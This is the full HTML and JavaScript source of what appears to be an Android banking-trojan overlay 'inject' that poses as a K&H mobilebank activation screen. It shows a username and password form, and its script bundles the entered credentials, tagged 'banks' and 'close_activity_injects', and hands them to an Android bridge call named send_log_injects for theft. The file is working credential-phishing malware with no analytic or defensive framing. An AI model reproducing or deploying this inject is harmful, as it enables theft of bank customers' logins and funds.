    <style>
        header {
            padding: 15px;
            border-bottom: 1px solid #386f84;
            box-shadow: 0px 2px 5px #c5c2c2;
        }

        section {
            padding: 15px;
            margin: 0 auto;
        }

        .input {
            width: 100%;
            margin-bottom: 15px;
            text-align: center;
            border: 0;
            border-bottom: 1px solid #386f84;
            padding: 10px;
        }

        .button {
            background-color: transparent;
            color: #fff;
            font-weight: 600;
            border: 0;
            border-radius: 2px;
            padding: 14px 40px;
            background-color: #00aeed;
            display: block;
            margin: 0 auto;
        }

        ::placeholder {
            opacity: 1;
            color: #c4c4c5;
            font-size: 18px;
        }

        :-moz-placeholder {
            opacity: 1;
            color: #c4c4c5;
            font-size: 18px;
        }

        ::-moz-placeholder {
            opacity: 1;
            color: #c4c4c5;
            font-size: 18px;
        }

        :-ms-input-placeholder {
            opacity: 1;
            color: #c4c4c5;
            font-size: 18px;
        }

        ::-webkit-input-placeholder {
            opacity: 1;
            color: #c4c4c5;
            font-size: 18px;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>

            <span style="margin-top: 3px;display: inline-block;"> K&H mobilebank activation </span>
        </header>
        <section>
            <input type="text" class="input" id="login" name="login" placeholder="username" autocomplete="off">
            <input type="password" class="input" id="password" name="password" placeholder="password" autocomplete="off">
        
            <input type="submit" class="button" id="sendData" value="continue">
        </section>
    </form>
    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            if(password.value.length < 4) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(login.value.length >= 4 && password.value.length >= 4) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
